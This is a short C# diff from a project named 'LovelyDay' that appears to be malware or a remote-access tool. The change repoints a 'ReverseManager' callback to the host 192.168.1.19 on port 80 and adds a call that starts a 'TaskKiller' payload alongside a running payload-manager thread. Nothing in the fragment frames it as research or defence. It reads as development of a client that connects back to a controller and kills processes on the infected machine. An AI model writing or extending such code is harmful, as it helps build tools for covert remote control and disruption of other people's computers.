@@ -28,7 +28,9 @@ namespace LovelyDay
                 ourPayloadManager.Update(Timer.GetDeltaTime());
             }));
             ourPayloadThread.Start();
-            ReverseManager.Initialize(IPAddress.Parse("192.168.1.18"), 80);
+            ReverseManager.Initialize(IPAddress.Parse("192.168.1.19"), 80);
+
+            ourPayloadManager.Start(Payload.TaskKiller);
         }
 
         static void Main(string[] args)
